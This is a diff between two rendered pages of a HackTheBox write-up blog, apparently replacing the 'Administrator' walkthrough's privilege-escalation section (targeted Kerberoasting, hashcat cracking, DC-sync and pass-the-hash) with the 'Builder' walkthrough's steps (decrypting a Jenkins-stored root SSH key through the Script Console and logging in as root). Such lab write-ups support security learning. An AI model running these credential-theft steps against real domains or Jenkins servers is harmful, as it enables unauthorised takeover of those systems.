 <h2 id="escalating-our-privileges"><span class="me-2">Escalating our privileges</span><a href="#escalating-our-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>After that taken care of, we can focus on exploiting the GenericWrite control.
-GenericWrite allows us to create a “fake” Kerberos ticket, which we can gather afterwards by running a Kerberoast attack.
-Lets create the “fake” ticket for Ethan first:</p>
+<p>My first step was to get an interactive shell going.<br />
+I spent quite some time on this step. I found vulnerabilities, but couldn’t use any to escalate my privileges.
+So I went back to the website, to see if I can find some hints there.<br /></p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>mily<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
-&lt;...&gt;
-Set-DomainObject <span class="nt">-Identity</span> ethan <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'servicePrincipalName'</span><span class="o">=</span><span class="s1">'http/fakehost'</span><span class="o">}</span>
-&lt;...&gt;
-<span class="nb">exit</span>
-&lt;...&gt;
-</pre></td></tr></tbody></table></code></div></div>
+<p>Navigating to “http://10.129.202.31:8080/user/jennifer/credentials/” reveals a stored SSH key for the root account.
+Then I visited the update page by clicking on the wrench symbol.</p>
 
-<p>Now we can use Impacket-GetUserSPNs to Kerberoast the ticket we generated:</p>
+<p><a href="/post-images/builder/wrench.jpg" class="popup img-link  shimmer"><img src="/post-images/builder/wrench.jpg" alt="root credentials page" loading="lazy"></a></p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>impacket-GetUserSPNs <span class="nt">-dc-ip</span> 10.129.95.15 administrator.htb/emily <span class="nt">-request-user</span> ethan <span class="nt">-outputfile</span> ethan_hash
+<p>The page doesn’t look that useful. We could try to replace the key, but it could also backfire and lock us out, which is why I decided to review the source code first.<br />
+Pressing [CTRL]+[Shift]+[C] allows us to click on an element to inspect it in detail.<br />
+Clicking on “Concealed for Confidentiality” and expanding the “div” reveals the secret key!</p>
+
+<p><a href="/post-images/builder/secret_key.jpg" class="popup img-link  shimmer"><img src="/post-images/builder/secret_key.jpg" alt="Secret key found" loading="lazy"></a></p>
+
+<p>A post on <a href="https://stackoverflow.com/questions/37683143/extract-passphrase-from-jenkins-credentials-xml">stackoverflow.com</a> reveals that you can decrypt it with a small Groovy Script.<br />
+So we navigate back to the “Script Console” and run:</p>
+
+<blockquote class="prompt-danger">
+  <p>If your output has some symbols that your browser cannot display, go back to the “Update”-page and repeat the process.</p>
+</blockquote>
+
+<pre><code class="language-Groovy">println( hudson.util.Secret.decrypt("{AQAAABAAAAowL***aaMR8IMMaKSM=}"))
+-----BEGIN OPENSSH PRIVATE KEY-----
 &lt;...&gt;
-Password:
-</pre></td></tr></tbody></table></code></div></div>
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
 
 <blockquote class="prompt-warning">
-  <p>If you didn’t get the error message “[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)” skip the next step.</p>
+  <p>Don’t click on the “Click to copy” button. Copy it manually, or else the key might not work.</p>
 </blockquote>
 
-<p>The error message we received means that the difference in date/time between our machine and the AD is too big to resolve the request.
-To fix it we need to disable network snyc, set our date/time to the time of the AD, execute the Kerberoast and then enable network sync again.</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>timedatectl set-ntp off
-&lt;...&gt;
-<span class="nb">sudo </span>rdate <span class="nt">-n</span> &lt;target IP&gt;
-&lt;...&gt;
-impacket-GetUserSPNs <span class="nt">-dc-ip</span> 10.129.95.15 administrator.htb/emily <span class="nt">-request-user</span> ethan <span class="nt">-outputfile</span> ethan_hash
-&lt;...&gt;
-Password:
-&lt;...&gt;
-<span class="nb">sudo </span>timedatectl set-ntp on
-&lt;...&gt;
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Now, we just need to crack the hash via hashcat.</p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 13100 ethan_hash /usr/share/wordlists/rockyou.txt
-&lt;...&gt;
-&lt;Hash&gt;:&lt;Password&gt;
-&lt;...&gt;
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>This allows us to execute the DC-sync attack. It will display the Administrator password hash, which we can use for pass the hash via Evil-WinRM.</p>
-
-<blockquote class="prompt-info">
-  <p>The structure of the hashes is domain\uid:rid:lmhash:nthash::: . Only copy the nthash section for pass the hash (without :::).</p>
-</blockquote>
+<p>Copy the key over to a file.<br />
+Now we just need to change the permissions on the file and use it to SSH into the root account.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1333,21 +1214,18 @@ Password:
 3
 4
 5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre>impacket-secretsdump <span class="nt">-outputfile</span> domain_hashes <span class="nt">-just-dc</span> administrator.htb/ethan@10.129.95.15
+</pre></td><td class="rouge-code"><pre><span class="nb">chmod </span>600 ssh_key
 &lt;...&gt;
-Password:
+ssh root@10.129.202.31 <span class="nt">-i</span> ssh_key
 &lt;...&gt;
-evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="k">***</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-&lt;...&gt;
+root@builder:~#
 </pre></td></tr></tbody></table></code></div></div>
 
 <h2 id="conclusion"><span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p>Thank you for reading, have a wonderful day and keep hacking!</p>
+
+<h2 id="what-i-learned-from-this-box"><span class="me-2">What I learned from this box:</span><a href="#what-i-learned-from-this-box" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Don’t focus solely on the RCE to escalate your privileges.</p>
 
   </div>
 
@@ -1368,9 +1246,9 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/windows/"
+            href="/tags/linux/"
             class="post-tag no-text-decoration"
-          >windows</a>
+          >linux</a>
         
           <a
             href="/tags/medium/"
@@ -1378,9 +1256,19 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
           >medium</a>
         
           <a
-            href="/tags/active-directory/"
+            href="/tags/jenkins/"
             class="post-tag no-text-decoration"
-          >active directory</a>
+          >jenkins</a>
+        
+          <a
+            href="/tags/cve/"
+            class="post-tag no-text-decoration"
+          >cve</a>
+        
+          <a
+            href="/tags/web-attacks/"
+            class="post-tag no-text-decoration"
+          >web-attacks</a>
         
       </div>
     
@@ -1416,21 +1304,21 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Administrator%20-%20Sanity-Archive&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Builder%20-%20Sanity-Archive&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Builder%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Administrator%20-%20Sanity-Archive&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Builder%20-%20Sanity-Archive&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Builder%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F&text=HackTheBox%20-%20Administrator%20-%20Sanity-Archive" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Builder%2F&text=HackTheBox%20-%20Builder%20-%20Sanity-Archive" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -2093,43 +1981,43 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
 
 
 
@@ -2145,7 +2033,7 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
       
         <article class="col">
-          <a href="/posts/HackTheBox-Builder/" class="post-preview card h-100">
+          <a href="/posts/Hack-The-Box-Shocker/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2157,44 +2045,16 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
 
 <time
   
-  data-ts="1760353200"
+  data-ts="1745060400"
   data-df="ll"
   
 >
-  Oct 13, 2025
+  Apr 19, 2025
 </time>
 
-              <h4 class="pt-0 my-2">HackTheBox - Builder</h4>
+              <h4 class="pt-0 my-2">HackTheBox - Shocker</h4>
               <div class="text-muted">
-                <p>Builder is a medium difficulty Linux machine, that requires us to exploit CVE-2024-23897 to gain a foothold. After gaining a foothold we are able to extract credentials for Jenkis, which allows us ...</p>
-              </div>
-            </div>
-          </a>
-        </article>
-      
-        <article class="col">
-          <a href="/posts/HackTheBox-Redelegate/" class="post-preview card h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1760353200"
-  data-df="ll"
-  
->
-  Oct 13, 2025
-</time>
-
-              <h4 class="pt-0 my-2">HackTheBox - Redelegate</h4>
-              <div class="text-muted">
-                <p>Redelegate is a hard Windows machine, that requires us to crack a password vault, which allows us to gain access to a SQL-server. The SQL-server allows us to bruteforce user RIDs to generate a user...</p>
+                <p>Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.</p>
               </div>
             </div>
           </a>
@@ -2228,6 +2088,34 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
           </a>
         </article>
       
+        <article class="col">
+          <a href="/posts/HackTheBox-Cap/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1749463200"
+  data-df="ll"
+  
+>
+  Jun  9, 2025
+</time>
+
+              <h4 class="pt-0 my-2">HackTheBox - Cap</h4>
+              <div class="text-muted">
+                <p>Cap is an easy Linux machine that requires us to abuse an IDOR vulnerability to gain credentials. After gaining a foothold we abuse a capability to escalate our privileges.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
     </nav>
   </aside>
   <!-- #related-posts -->
@@ -2243,22 +2131,18 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Ad
 
   
     <a
-      href="/posts/HackTheBox-Cap/"
+      href="/posts/HackTheBox-Redelegate/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>HackTheBox - Cap</p>
+      <p>HackTheBox - Redelegate</p>
     </a>
   
 
   
-    <a
-      href="/posts/HackTheBox-Validation/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>HackTheBox - Validation</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
